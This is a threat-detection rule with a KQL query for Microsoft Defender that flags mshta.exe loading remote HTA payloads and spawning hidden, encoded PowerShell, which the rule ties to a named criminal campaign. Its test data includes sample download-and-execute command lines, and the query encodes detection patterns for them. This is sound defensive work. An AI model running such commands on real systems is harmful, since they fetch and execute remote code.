# Name
Radiant Spider (SilentSkimmer) - Suspicious MSHTA Execution and PowerShell Spawning

# Description
This detection identifies suspicious use of mshta.exe to load remote HTA files over HTTP, as well as mshta.exe spawning heavily obfuscated PowerShell processes. This behavior was observed in Radiant Spider (SilentSkimmer) campaigns where mshta.exe is used for initial staging by pulling and executing remote HTA payloads, often followed by encoded PowerShell execution to further the attack chain.

# References
- https://www.crowdstrike.com/adversaries/radiant-spider/
- https://www.sleuthcon.com/radiant-spider-unveiled
- https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- RADIANT SPIDER
- CL-CRI-0941
- SilentSkimmer

# MITRE ATT&CK
- T1218.005: System Binary Proxy Execution: Mshta
- T1059.001: Command and Scripting Interpreter: PowerShell

# Data Sources
- Microsoft Defender XDR
  - DeviceProcessEvents

# Query

## Query 1: Suspicious MSHTA Execution and PowerShell Spawning

```kql
// Test Data Table
let DeviceProcessEvents = datatable(
    Timestamp: datetime,
    DeviceId: string,
    DeviceName: string,
    ActionType: string,
    FileName: string,
    FolderPath: string,
    SHA256: string,
    ProcessCommandLine: string,
    ProcessId: long,
    AccountName: string,
    AccountDomain: string,
    InitiatingProcessFileName: string,
    InitiatingProcessCommandLine: string,
    InitiatingProcessId: long,
    InitiatingProcessParentFileName: string
)
[
    // Case 1: Mshta executing external HTA over HTTP
    datetime(2026-02-19 10:15:30), "device-guid-1", "WebSrv01.contoso.com", "ProcessCreated", 
    "mshta.exe", "C:\\Windows\\System32\\mshta.exe", "a5b3c2d1...", 
    "mshta http://192.168.1.50/payload.hta", 8832, "DefaultAppPool", "IIS APPPOOL", 
    "w3wp.exe", "w3wp.exe -ap \"DefaultAppPool\"", 5100, "svchost.exe",

    // Case 2: Mshta spawning PowerShell with specific obfuscation flags
    datetime(2026-02-19 10:16:00), "device-guid-1", "WebSrv01.contoso.com", "ProcessCreated", 
    "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "b2c3d4e5...", 
    "powershell.exe -nop -w hidden -enc JABzAD0ATgBl...", 6620, "DefaultAppPool", "IIS APPPOOL", 
    "mshta.exe", "mshta http://192.168.1.50/payload.hta", 8832, "w3wp.exe"
];
// Detection Logic
DeviceProcessEvents
| where Timestamp > ago(14d)
// Look for mshta calling an external IP/HTA file OR mshta spawning heavily obfuscated PowerShell
| where (FileName =~ "mshta.exe" and ProcessCommandLine has "http://" and ProcessCommandLine has ".hta")
   or (InitiatingProcessFileName =~ "mshta.exe" and FileName =~ "powershell.exe" and ProcessCommandLine has_all("-nop", "-w hidden", "-enc"))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, AccountName
```
